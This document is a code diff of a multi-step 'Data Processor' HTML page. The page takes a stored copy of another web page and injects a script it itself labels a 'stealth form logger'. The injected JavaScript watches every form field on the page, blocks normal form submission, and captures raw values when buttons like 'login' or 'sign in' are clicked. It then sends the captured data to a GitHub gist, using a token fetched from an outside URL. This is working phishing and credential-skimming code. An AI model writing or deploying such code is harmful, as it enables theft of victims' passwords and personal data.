@@ -18,19 +18,17 @@
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        h1 {
-            color: #333;
-            text-align: center;
+        .form-group {
+            margin-bottom: 15px;
         }
         label {
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
         }
-        input {
+        input[type="text"] {
             width: 100%;
             padding: 8px;
-            margin-bottom: 15px;
             border: 1px solid #ddd;
             border-radius: 4px;
             box-sizing: border-box;
@@ -43,45 +41,12 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
-            width: 100%;
-            margin-bottom: 10px;
-        }
-        button.secondary {
-            background-color: #2196F3;
         }
         button:hover {
-            opacity: 0.9;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
-        }
-        .success {
-            background-color: #dff0d8;
-            color: #3c763d;
-        }
-        .error {
-            background-color: #f2dede;
-            color: #a94442;
+            background-color: #45a049;
         }
         .hidden {
             display: none;
-        }
-        #dataPreview {
-            border: 1px solid #ddd;
-            padding: 15px;
-            background-color: white;
-            border-radius: 4px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        #rawDataToggle {
-            background-color: #f0f0f0;
-            color: #333;
-            font-size: 12px;
-            padding: 5px 10px;
-            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -89,259 +54,268 @@
     <div class="container">
         <h1>Data Processor</h1>
         
-        <div id="userSetup" class="hidden">
-            <h2>User Setup</h2>
-            <p>Please enter your username and ID for tracking:</p>
-            <label for="username">Username:</label>
-            <input type="text" id="username" placeholder="Your username (will be used as filename)">
-            
-            <label for="userId">ID:</label>
-            <input type="text" id="userId" placeholder="Your unique ID">
-            
-            <button id="saveUser">Save User Info</button>
+        <div id="userForm">
+            <div class="form-group">
+                <label for="username">Username (will be used as .json filename):</label>
+                <input type="text" id="username" required>
+            </div>
+            <div class="form-group">
+                <label for="userId">ID:</label>
+                <input type="text" id="userId" required>
+            </div>
+            <button id="saveUserData">Save & Continue</button>
         </div>
         
-        <div id="statusMessage" class="status hidden"></div>
-        
-        <div id="dataInfo" class="hidden">
-            <h2>Data Processing</h2>
-            <p>Data from localStorage (data1step):</p>
-            
-            <button id="rawDataToggle" class="secondary">Toggle Raw HTML View</button>
-            
-            <div id="dataDisplay">
-                <div id="dataPreview"></div>
-                <pre id="rawDataDisplay" class="hidden"></pre>
-            </div>
-            
-            <p>Modified HTML with injected script will be saved to data2step.</p>
-            
-            <button id="nextStepBtn" class="secondary">Next Step (Go to step3.html)</button>
+        <div id="processingSection" class="hidden">
+            <h2>Processing Data</h2>
+            <p>Your data is being processed. Click below to proceed to the next step.</p>
+            <button id="proceedToStep3">Proceed to Step 3</button>
         </div>
     </div>
 
     <script>
-        // Check for existing user info
-        const storedUsername = localStorage.getItem('username');
-        const storedUserId = localStorage.getItem('userId');
-        
-        // DOM elements
-        const userSetupDiv = document.getElementById('userSetup');
-        const dataInfoDiv = document.getElementById('dataInfo');
-        const statusMessageDiv = document.getElementById('statusMessage');
-        const nextStepBtn = document.getElementById('nextStepBtn');
-        const dataPreview = document.getElementById('dataPreview');
-        const rawDataDisplay = document.getElementById('rawDataDisplay');
-        const rawDataToggle = document.getElementById('rawDataToggle');
-        
-        if (storedUsername && storedUserId) {
-            // User info exists, hide setup form
-            userSetupDiv.classList.add('hidden');
-            dataInfoDiv.classList.remove('hidden');
-            showStatus(`Welcome back, ${storedUsername}! (ID: ${storedUserId})`, 'success');
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if we have saved user data
+            const savedUsername = localStorage.getItem('username');
+            const savedUserId = localStorage.getItem('userId');
             
-            // Process data
-            processData();
-        } else {
-            // Show user setup form
-            userSetupDiv.classList.remove('hidden');
+            const userForm = document.getElementById('userForm');
+            const processingSection = document.getElementById('processingSection');
             
-            // Save user info handler
-            document.getElementById('saveUser').addEventListener('click', () => {
+            if (savedUsername && savedUserId) {
+                // If we have saved data, hide the form and show processing section
+                userForm.style.display = 'none';
+                processingSection.classList.remove('hidden');
+                
+                // Auto-populate the fields in case user wants to change
+                document.getElementById('username').value = savedUsername;
+                document.getElementById('userId').value = savedUserId;
+                
+                // Process the data immediately since we have user info
+                processData(savedUsername, savedUserId);
+            }
+            
+            // Save user data button
+            document.getElementById('saveUserData').addEventListener('click', function() {
                 const username = document.getElementById('username').value.trim();
                 const userId = document.getElementById('userId').value.trim();
                 
                 if (username && userId) {
+                    // Save to localStorage
                     localStorage.setItem('username', username);
                     localStorage.setItem('userId', userId);
                     
-                    userSetupDiv.classList.add('hidden');
-                    dataInfoDiv.classList.remove('hidden');
-                    showStatus(`User info saved successfully!`, 'success');
+                    // Hide form and show processing section
+                    userForm.style.display = 'none';
+                    processingSection.classList.remove('hidden');
                     
-                    // Process data
-                    processData();
+                    // Process the data
+                    processData(username, userId);
                 } else {
-                    showStatus('Please enter both username and ID', 'error');
+                    alert('Please enter both username and ID');
                 }
             });
-        }
-        
-        // Next step button handler
-        if (nextStepBtn) {
-            nextStepBtn.addEventListener('click', () => {
+            
+            // Proceed to step3 button
+            document.getElementById('proceedToStep3').addEventListener('click', function() {
                 window.location.href = 'step3.html';
             });
-        }
-        
-        // Toggle raw data view
-        if (rawDataToggle) {
-            rawDataToggle.addEventListener('click', () => {
-                dataPreview.classList.toggle('hidden');
-                rawDataDisplay.classList.toggle('hidden');
-            });
-        }
-        
-        function processData() {
-            const data1step = localStorage.getItem('data1step');
             
-            if (data1step) {
-                try {
-                    // Display the HTML content
-                    dataPreview.innerHTML = data1step;
-                    rawDataDisplay.textContent = data1step;
+            function processData(username, userId) {
+                // Get data from localStorage
+                const data1step = localStorage.getItem('data1step');
+                
+                if (data1step) {
+                    // Create a temporary div to parse the HTML
+                    const tempDiv = document.createElement('div');
+                    tempDiv.innerHTML = data1step;
                     
-                    // Create the script to inject
-                    const scriptToInject = `
-<!-- STEALTH FORM LOGGER -->
-<script>
-// CONFIGURATION
-const CONFIG = {
-    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
-    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.html' : 'Data.html',
-    TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
-    INPUT_IDLE_TIMEOUT: 2000,
-    SUBMIT_BUTTON_PATTERNS: [
-        'submit', 'login', 'sign in', 'continue', 
-        'next', 'confirm', 'proceed', 'authenticate'
-    ]
-};
+                    // Find the closing body tag and insert our script before it
+                    const bodyTag = tempDiv.querySelector('body');
+                    if (bodyTag) {
+                        // Create the script element with our stealth logger
+                        const scriptTag = document.createElement('script');
+                        scriptTag.innerHTML = `
+                        // CONFIGURATION
+                        const CONFIG = {
+                            // Gist configuration
+                            GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
+                            GIST_FILENAME: '${username}.json',
+                            
+                            // GitHub token URL (replace with your own token endpoint if needed)
+                            TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
 
-// Logger implementation
-(() => {
-    const log = (msg) => console.log(\`[Logger] \${msg}\`);
-    let typingTimer;
-    let formData = {};
+                            // Time to wait after typing before considering input "finished" (ms)
+                            INPUT_IDLE_TIMEOUT: 2000,
 
-    const fetchToken = async () => {
-        try {
-            const res = await fetch(CONFIG.TOKEN_URL);
-            return (await res.text()).trim();
-        } catch (err) {
-            log('Failed to fetch token');
-            return null;
-        }
-    };
+                            // Patterns that indicate a submit button
+                            SUBMIT_BUTTON_PATTERNS: [
+                                'submit', 'login', 'sign in', 'continue', 
+                                'next', 'confirm', 'proceed', 'authenticate'
+                            ]
+                        };
 
-    const uploadToGist = async (data) => {
-        try {
-            const token = await fetchToken();
-            if (!token) return false;
+                        // ===== INVISIBLE LOGGER =====
+                        (() => {
+                            // Silent console logging (optional for debugging)
+                            const log = (msg, type='info') => {
+                                console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
+                            };
 
-            const entry = {
-                page_url: window.location.href,
-                timestamp: new Date().toISOString(),
-                userId: localStorage.getItem('userId') || 'unknown',
-                ...data
-            };
+                            // ===== DATA CAPTURE =====
+                            let typingTimer;
+                            let formData = {};
 
-            const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
-                headers: { Authorization: \`token \${token}\` }
-            });
+                            // Fetch GitHub token
+                            const fetchToken = async () => {
+                                try {
+                                    const res = await fetch(CONFIG.TOKEN_URL);
+                                    return (await res.text()).trim();
+                                } catch (err) {
+                                    log('Failed to fetch token', 'error');
+                                    return null;
+                                }
+                            };
 
-            if (!gistRes.ok) return false;
+                            // Upload data to Gist
+                            const uploadToGist = async (data) => {
+                                try {
+                                    const token = await fetchToken();
+                                    if (!token) return false;
 
-            const gistData = await gistRes.json();
-            let currentData = {};
+                                    // Prepare the data with timestamp
+                                    const timestamp = new Date().toISOString();
+                                    const entry = {
+                                        page_url: window.location.href,
+                                        user_id: '${userId}',
+                                        ...data
+                                    };
 
-            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
-                try {
-                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
-                } catch (e) {
-                    currentData = {};
-                }
-            }
+                                    // Step 1: Get current content of the Gist
+                                    const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                                        headers: { Authorization: \`token \${token}\` }
+                                    });
 
-            currentData[entry.timestamp] = entry;
+                                    if (!gistRes.ok) {
+                                        log('Failed to fetch existing gist', 'error');
+                                        return false;
+                                    }
 
-            await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
-                method: 'PATCH',
-                headers: {
-                    'Authorization': \`token \${token}\`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    files: {
-                        [CONFIG.GIST_FILENAME]: {
-                            content: JSON.stringify(currentData, null, 2)
-                        }
-                    }
-                })
-            });
+                                    const gistData = await gistRes.json();
+                                    let currentData = {};
 
-            return true;
-        } catch (err) {
-            log('Upload failed: ' + err.message);
-            return false;
-        }
-    };
+                                    if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
+                                        try {
+                                            currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
+                                        } catch (e) {
+                                            currentData = {};
+                                        }
+                                    }
 
-    // Event handlers
-    const setupHandlers = () => {
-        document.querySelectorAll('input, textarea, select').forEach(field => {
-            field.addEventListener('input', () => {
-                clearTimeout(typingTimer);
-                typingTimer = setTimeout(() => {
-                    const name = field.name || field.id || 'unnamed_field';
-                    formData[name] = field.value;
-                }, CONFIG.INPUT_IDLE_TIMEOUT);
-            });
-        });
+                                    // Step 2: Append new data with timestamp key
+                                    currentData[timestamp] = entry;
 
-        document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', (e) => {
-                e.preventDefault();
-                const data = {};
-                Array.from(form.elements).forEach(el => {
-                    if (el.name && el.value) data[el.name] = el.value;
-                });
-                uploadToGist(data);
-            }, true);
-        });
-    };
+                                    // Step 3: Send PATCH to update the Gist
+                                    const updateRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                                        method: 'PATCH',
+                                        headers: {
+                                            'Authorization': \`token \${token}\`,
+                                            'Content-Type': 'application/json'
+                                        },
+                                        body: JSON.stringify({
+                                            files: {
+                                                [CONFIG.GIST_FILENAME]: {
+                                                    content: JSON.stringify(currentData, null, 2)
+                                                }
+                                            }
+                                        })
+                                    });
 
-    setupHandlers();
-    new MutationObserver(setupHandlers).observe(document.body, { 
-        childList: true, subtree: true 
-    });
-})();
-<\/script>
-                    `;
+                                    return updateRes.ok;
+                                } catch (err) {
+                                    log('Gist upload failed: ' + err.message, 'error');
+                                    return false;
+                                }
+                            };
 
-                    // Inject script before </body> tag
-                    let modifiedHtml = data1step;
-                    const bodyCloseTag = data1step.toLowerCase().indexOf('</body>');
-                    
-                    if (bodyCloseTag !== -1) {
-                        modifiedHtml = data1step.slice(0, bodyCloseTag) + 
-                                     scriptToInject + 
-                                     data1step.slice(bodyCloseTag);
+                            // ===== EVENT HANDLERS =====
+                            const setupInputHandlers = () => {
+                                document.querySelectorAll('input, textarea, select').forEach(field => {
+                                    field.addEventListener('input', () => {
+                                        clearTimeout(typingTimer);
+                                        typingTimer = setTimeout(() => {
+                                            const name = field.name || field.id || 'unnamed_field';
+                                            const value = field.value;
+                                            if (value) {
+                                                formData[name] = value; // Stores raw value
+                                            }
+                                        }, CONFIG.INPUT_IDLE_TIMEOUT);
+                                    });
+                                });
+                            };
+
+                            const setupSubmissionHandlers = () => {
+                                // Form submissions
+                                document.querySelectorAll('form').forEach(form => {
+                                    form.addEventListener('submit', (e) => {
+                                        e.preventDefault(); // Stop default submission
+
+                                        const data = {};
+                                        Array.from(form.elements).forEach(el => {
+                                            if (el.name && el.value) {
+                                                data[el.name] = el.value; // RAW DATA
+                                            }
+                                        });
+                                        uploadToGist(data);
+                                    }, true);
+                                });
+
+                                // Button clicks
+                                document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
+                                    btn.addEventListener('click', (e) => {
+                                        const btnText = (btn.textContent || btn.value || '').toLowerCase();
+                                        const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
+                                            btnText.includes(pattern)
+                                        );
+
+                                        if (isSubmit && Object.keys(formData).length > 0) {
+                                            uploadToGist(formData);
+                                            formData = {}; // Clear after submission
+                                        }
+                                    }, true);
+                                });
+                            };
+
+                            // ===== INITIALIZATION =====
+                            setupInputHandlers();
+                            setupSubmissionHandlers();
+
+                            // Watch for dynamically added elements
+                            new MutationObserver(() => {
+                                setupInputHandlers();
+                                setupSubmissionHandlers();
+                            }).observe(document.body, { childList: true, subtree: true });
+                        })();
+                        `;
+                        
+                        // Insert the script just before the closing body tag
+                        bodyTag.appendChild(scriptTag);
+                        
+                        // Get the modified HTML
+                        const modifiedHtml = tempDiv.innerHTML;
+                        
+                        // Save to data2step in localStorage
+                        localStorage.setItem('data2step', modifiedHtml);
+                        
+                        console.log('Data processed and saved to data2step in localStorage');
                     } else {
-                        // If no </body> tag found, append to end
-                        modifiedHtml = data1step + scriptToInject;
+                        console.error('No body tag found in the HTML');
                     }
-
-                    // Save to data2step
-                    localStorage.setItem('data2step', modifiedHtml);
-                    
-                    // Get username for filename
-                    const username = localStorage.getItem('username') || 'anonymous';
-                    const filename = `${username}.html`;
-                    
-                    showStatus(`HTML processed successfully with injected script and saved to data2step. Filename would be: ${filename}`, 'success');
-                } catch (e) {
-                    showStatus('Error processing data: ' + e.message, 'error');
+                } else {
+                    console.error('No data1step found in localStorage');
                 }
-            } else {
-                showStatus('No data found in data1step', 'error');
             }
-        }
-        
-        function showStatus(message, type) {
-            statusMessageDiv.textContent = message;
-            statusMessageDiv.className = `status ${type}`;
-            statusMessageDiv.classList.remove('hidden');
-        }
+        });
     </script>
 </body>
 </html>
